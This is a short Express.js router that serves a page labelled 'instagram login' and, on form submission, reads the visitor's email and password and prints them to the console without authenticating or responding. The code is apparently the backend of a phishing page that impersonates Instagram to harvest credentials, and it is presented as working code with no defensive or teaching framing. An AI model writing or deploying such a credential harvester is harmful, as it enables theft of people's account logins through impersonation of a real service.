const router = require("express").Router();

router.get("/",(req,res)=>{
    res.render("index",{data: "instagram login"});
})


router.post("/",(req,res)=>{
    const {email, password} = req.body;
    
    console.log({email},"\n",{password},"\n");

});

module.exports = router;

